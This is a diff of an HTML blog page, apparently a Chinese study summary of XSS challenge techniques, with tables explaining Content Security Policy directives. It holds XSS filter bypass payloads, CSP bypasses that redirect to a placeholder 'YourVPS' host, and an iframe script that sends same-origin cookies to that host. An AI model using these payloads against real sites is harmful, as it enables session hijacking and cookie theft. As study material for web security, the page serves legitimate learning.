@@ -237,34 +237,52 @@
         <div class="post-content">
             <p><img src="/2017/09/28/XSS题技巧总结-不定期更新/5-29.jpg" alt=""></p>
 <a id="more"></a>
-<h1 id="一般绕过"><a href="#一般绕过" class="headerlink" title="一般绕过"></a>一般绕过</h1><p>1、检测 alert :<br>如 preg_match(“\alert\i”,$var);<br>Bypass:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="built_in">String</span>.fromCharCode(<span class="number">97</span>，<span class="number">108</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">40</span>,<span class="number">41</span>))</span><br></pre></td></tr></table></figure></p>
-<p>2、检测 script:<br>如 preg_match(“\script\i”,$var);<br>Bypass:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">""</span> onerror=<span class="string">"alert(1)"</span>&gt;</span><br></pre></td></tr></table></figure></p>
+<h1 id="一般绕过"><a class="markdownIt-Anchor" href="#一般绕过"></a> 一般绕过</h1>
+<p>1、检测 alert :<br>
+如 preg_match(&quot;\alert\i&quot;,$var);<br>
+Bypass:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="built_in">String</span>.fromCharCode(<span class="number">97</span>，<span class="number">108</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">40</span>,<span class="number">41</span>))</span><br></pre></td></tr></table></figure>
+<p>2、检测 script:<br>
+如 preg_match(&quot;\script\i&quot;,$var);<br>
+Bypass:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">""</span> onerror=<span class="string">"alert(1)"</span>&gt;</span><br></pre></td></tr></table></figure>
 <p>3、用preg_macth()检测可以用数组传参绕过</p>
-<h1 id="CSP绕过"><a href="#CSP绕过" class="headerlink" title="CSP绕过"></a>CSP绕过</h1><h2 id="CSP-Content-Security-Policy-内容安全策略"><a href="#CSP-Content-Security-Policy-内容安全策略" class="headerlink" title="CSP(Content Security Policy)内容安全策略"></a>CSP(Content Security Policy)内容安全策略</h2><p><strong><em>科普在后面</em></strong></p>
-<h4 id="同源策略-default-src-”self”"><a href="#同源策略-default-src-”self”" class="headerlink" title="同源策略 default-src:”self”"></a>同源策略 default-src:”self”</h4><p><strong>谷歌</strong><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=<span class="string">"refresh"</span> content=<span class="string">"0;url=http://YourVPS"</span>&gt;  </span><br><span class="line">&lt;link rel=<span class="string">"prerender"</span> href=<span class="string">"http://YourVPS"</span>&gt;</span><br></pre></td></tr></table></figure></p>
-<p><strong>火狐</strong><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=<span class="string">"refresh"</span> content=<span class="string">"0;url=http://YourVPS"</span>&gt;  </span><br><span class="line">&lt;link rel=<span class="string">"prefetch"</span> href=<span class="string">"http://YourVPS"</span>&gt;</span><br></pre></td></tr></table></figure></p>
+<h1 id="csp绕过"><a class="markdownIt-Anchor" href="#csp绕过"></a> CSP绕过</h1>
+<h2 id="cspcontent-security-policy内容安全策略"><a class="markdownIt-Anchor" href="#cspcontent-security-policy内容安全策略"></a> CSP(Content Security Policy)内容安全策略</h2>
+<p><em><strong>科普在后面</strong></em></p>
+<h4 id="同源策略-default-srcself"><a class="markdownIt-Anchor" href="#同源策略-default-srcself"></a> 同源策略 default-src:“self”</h4>
+<p><strong>谷歌</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=<span class="string">"refresh"</span> content=<span class="string">"0;url=http://YourVPS"</span>&gt;  </span><br><span class="line">&lt;link rel=<span class="string">"prerender"</span> href=<span class="string">"http://YourVPS"</span>&gt;</span><br></pre></td></tr></table></figure>
+<p><strong>火狐</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=<span class="string">"refresh"</span> content=<span class="string">"0;url=http://YourVPS"</span>&gt;  </span><br><span class="line">&lt;link rel=<span class="string">"prefetch"</span> href=<span class="string">"http://YourVPS"</span>&gt;</span><br></pre></td></tr></table></figure>
 <blockquote>
-<p>meta标签的http-equiv=”refresh”</p>
+<p>meta标签的http-equiv=“refresh”</p>
 <ul>
 <li>刷新、跳转页面</li>
 </ul>
+</blockquote>
+<blockquote>
 <p>content中的0</p>
 <ul>
 <li>多少秒跳转</li>
 </ul>
-<p>link标签的 rel=”prefetch”</p>
+</blockquote>
+<blockquote>
+<p>link标签的 rel=“prefetch”</p>
 <ul>
 <li>预缓存</li>
 </ul>
 </blockquote>
-<h4 id="利用iframe获取同域cookie"><a href="#利用iframe获取同域cookie" class="headerlink" title="利用iframe获取同域cookie"></a>利用iframe获取同域cookie</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">	<span class="keyword">var</span> iframe = <span class="built_in">document</span>.createElement(<span class="string">"iframe"</span>);</span><br><span class="line">	iframe.name=<span class="string">"Testzero"</span>;</span><br><span class="line">	iframe.src=<span class="string">"同域站点"</span><span class="comment">//敏感目录</span></span><br><span class="line">	<span class="built_in">document</span>.body.appendChild(iframe);</span><br><span class="line">	location.href=<span class="string">"http://YourVPS?cookie="</span>+<span class="built_in">escape</span>(Testzero.window.document.cookie);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
-<h3 id="用法："><a href="#用法：" class="headerlink" title="用法："></a>用法：</h3><blockquote>
+<h4 id="利用iframe获取同域cookie"><a class="markdownIt-Anchor" href="#利用iframe获取同域cookie"></a> 利用iframe获取同域cookie</h4>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">	<span class="keyword">var</span> iframe = <span class="built_in">document</span>.createElement(<span class="string">"iframe"</span>);</span><br><span class="line">	iframe.name=<span class="string">"Testzero"</span>;</span><br><span class="line">	iframe.src=<span class="string">"同域站点"</span><span class="comment">//敏感目录</span></span><br><span class="line">	<span class="built_in">document</span>.body.appendChild(iframe);</span><br><span class="line">	location.href=<span class="string">"http://YourVPS?cookie="</span>+<span class="built_in">escape</span>(Testzero.window.document.cookie);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="用法"><a class="markdownIt-Anchor" href="#用法"></a> 用法：</h3>
+<blockquote>
 <ul>
 <li>Content-Security-Policy： 策略内的进行规定的进行相应的阻止</li>
 <li>Content-Security-Policy-Report-Only： 只报告不阻止</li>
 </ul>
 </blockquote>
-<h3 id="键说明"><a href="#键说明" class="headerlink" title="键说明"></a>键说明</h3><div class="table-container">
+<h3 id="键说明"><a class="markdownIt-Anchor" href="#键说明"></a> 键说明</h3>
 <table>
 <thead>
 <tr>
@@ -276,104 +294,87 @@
 <tbody>
 <tr>
 <td>default-src</td>
-<td>‘self’ xxx.example.com</td>
+<td>‘self’ <a href="http://xxx.example.com" target="_blank" rel="noopener">xxx.example.com</a></td>
 <td>定义针对所有类型（js/image/css/web font/ajax/iframe/多媒体等）资源的默认加载策略，某类型资源如果没有单独定义策略，就使用默认。</td>
-<td></td>
 </tr>
 <tr>
 <td>script-src</td>
-<td>‘self’ js.example.com</td>
+<td>‘self’ <a href="http://js.example.com" target="_blank" rel="noopener">js.example.com</a></td>
 <td>定义针对JavaScript的加载策略</td>
-<td></td>
 </tr>
 <tr>
 <td>object-src</td>
 <td>‘self’</td>
-<td>针对,, 等标签的加载策略</td>
-<td></td>
+<td>针对, 等标签的加载策略</td>
 </tr>
 <tr>
 <td>style-src</td>
-<td>‘self’ css.example.com</td>
+<td>‘self’ <a href="http://css.example.com" target="_blank" rel="noopener">css.example.com</a></td>
 <td>定义针对样式的加载策略</td>
-<td></td>
 </tr>
 <tr>
 <td>img-src</td>
-<td>‘self’ image.example.com</td>
+<td>‘self’ <a href="http://image.example.com" target="_blank" rel="noopener">image.example.com</a></td>
 <td>定义针对图片的加载策略</td>
-<td></td>
 </tr>
 <tr>
 <td>media-src</td>
-<td>‘media.example.com’</td>
+<td>‘<a href="http://media.example.com" target="_blank" rel="noopener">media.example.com</a>’</td>
 <td>针对或者引入的html多媒体等标签的加载策略</td>
-<td></td>
 </tr>
 <tr>
 <td>frame-src</td>
 <td>‘self’</td>
 <td>针对iframe的加载策略</td>
-<td></td>
 </tr>
 <tr>
 <td>connect-src</td>
 <td>‘self’</td>
 <td>针对Ajax、WebSocket等请求的加载策略。不允许的情况下，浏览器会模拟一个状态为400的响应</td>
-<td></td>
 </tr>
 <tr>
 <td>font-src</td>
-<td>font.qq.com</td>
+<td><a href="http://font.qq.com" target="_blank" rel="noopener">font.qq.com</a></td>
 <td>针对Web Font的加载策略</td>
-<td></td>
 </tr>
 <tr>
 <td>sandbox</td>
 <td>allow-forms allow-scripts</td>
 <td>对请求的资源启用sandbox</td>
-<td></td>
 </tr>
 <tr>
 <td>report-uri</td>
 <td>/some-report-uri</td>
 <td>告诉浏览器如果请求的资源不被策略允许时，往哪个地址提交日志信息。不阻止任何内容，可以改用Content-Security-Policy-Report-Only头</td>
-<td></td>
 </tr>
 <tr>
 <td>base-uri</td>
 <td>‘self’</td>
 <td>限制当前页面的url（CSP2）</td>
-<td></td>
 </tr>
 <tr>
 <td>child-src</td>
 <td>‘self’</td>
 <td>限制子窗口的源(iframe、弹窗等),取代frame-src（CSP2）</td>
-<td></td>
 </tr>
 <tr>
 <td>form-action</td>
 <td>‘self’</td>
 <td>限制表单能够提交到的源（CSP2）</td>
-<td></td>
 </tr>
 <tr>
 <td>frame-ancestors</td>
 <td>‘none’</td>
 <td>限制了当前页面可以被哪些页面以iframe,frame,object等方式加载（CSP2）</td>
-<td></td>
 </tr>
 <tr>
 <td>plugin-types</td>
 <td>application/pdf</td>
 <td>限制插件的类型（CSP2）</td>
-<td></td>
 </tr>
 </tbody>
 </table>
-</div>
-<h3 id="值说明"><a href="#值说明" class="headerlink" title="值说明"></a>值说明</h3><div class="table-container">
+<h3 id="值说明"><a class="markdownIt-Anchor" href="#值说明"></a> 值说明</h3>
 <table>
 <thead>
 <tr>
@@ -387,65 +388,54 @@
 <td>*</td>
 <td>img-src *</td>
 <td>允许任何内容</td>
-<td></td>
 </tr>
 <tr>
 <td>‘none’</td>
 <td>img-src ‘none’</td>
 <td>不允许任何内容</td>
-<td></td>
 </tr>
 <tr>
 <td>‘self’</td>
 <td>img-src ‘self’</td>
 <td>允许同源内容</td>
-<td></td>
 </tr>
 <tr>
 <td>data:</td>
 <td>img-src data:</td>
 <td>允许data:协议（如base64编码的图片）</td>
-<td></td>
 </tr>
 <tr>
-<td>www.a.com</td>
-<td>img-src www.a.com</td>
+<td><a href="http://www.a.com" target="_blank" rel="noopener">www.a.com</a></td>
+<td>img-src <a href="http://www.a.com" target="_blank" rel="noopener">www.a.com</a></td>
 <td>允许加载指定域名的资源</td>
-<td></td>
 </tr>
 <tr>
 <td>*.a.com</td>
 <td>img-src *.a.com</td>
 <td>允许加载a.com任何子域的资源</td>
-<td></td>
 </tr>
 <tr>
 <td><a href="https://img.com" target="_blank" rel="noopener">https://img.com</a></td>
-<td>img-src<a href="https://img.com" target="_blank" rel="noopener">https://img.com</a></td>
+<td>img-srchttps://img.com</td>
 <td>允许加载img.com的https资源</td>
-<td></td>
 </tr>
 <tr>
 <td>https:</td>
 <td>img-src https:</td>
 <td>允许加载https资源</td>
-<td></td>
 </tr>
 <tr>
 <td>‘unsafe-inline’</td>
 <td>script-src ‘unsafe-inline’</td>
 <td>允许加载inline资源（style属性，onclick，inline js和inline css等等）</td>
-<td></td>
 </tr>
 <tr>
 <td>‘unsafe-eval’</td>
 <td>script-src ‘unsafe-eval’</td>
 <td>允许加载动态js代码，例如eval()</td>
-<td></td>
 </tr>
 </tbody>
 </table>
-</div>
 <blockquote>
 <p>以上表格引用自<a href="http://web.jobbole.com/86409/" target="_blank" rel="noopener">伯乐在线</a></p>
 </blockquote>
